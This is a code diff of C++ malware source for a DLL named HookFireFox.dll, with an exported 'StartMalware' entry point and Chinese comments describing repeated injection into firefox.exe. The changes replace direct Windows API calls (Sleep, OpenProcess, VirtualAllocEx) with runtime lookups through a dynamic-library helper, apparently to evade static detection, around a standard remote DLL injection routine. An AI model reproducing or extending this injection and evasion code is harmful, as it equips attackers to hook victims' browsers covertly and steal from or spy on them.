@@ -3,7 +3,10 @@
 #include <thread>
 #include "loader.h"
 //#include "persistence.h"
+#include "dynamic_library.h"
 #include "utils.h"
+
+HINSTANCE hdll = NULL;
 
 // rundll32.exe HookFireFox.dll,StartMalware
 // 匯出的注入函數，將 HookFireFox.dll 持續注入到 firefox.exe 中
@@ -46,7 +49,7 @@ BOOL RepeatInjectTargets()
             InjectDll(pid, toUTF16(GetCurrentDllPath()));
         }
 
-        Sleep(2000);
+        GetProcFromDll<Sleep_t>(hdll, "Sleep", "kernel32.dll")(2000);
     }
 }
 
@@ -54,7 +57,7 @@ BOOL RepeatInjectTargets()
 BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
 {
     // 1. OpenProcess 開啟目標 Process
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    HANDLE hProcess = GetProcFromDll<OpenProcess_t>(hdll, "OpenProcess", "kernel32.dll")(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProcess == nullptr)
     {
         DWORD error = GetLastError();
@@ -63,8 +66,7 @@ BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
     }
 
     // 2. VirtualAllocEx 在目標 Process 申請一塊記憶體
-    LPVOID pRemoteMemory =
-        VirtualAllocEx(hProcess, nullptr, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    LPVOID pRemoteMemory = GetProcFromDll<VirtualAllocEx_t>(hdll, "VirtualAllocEx", "kernel32.dll")(hProcess, nullptr, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (pRemoteMemory == nullptr)
     {
         DWORD error = GetLastError();
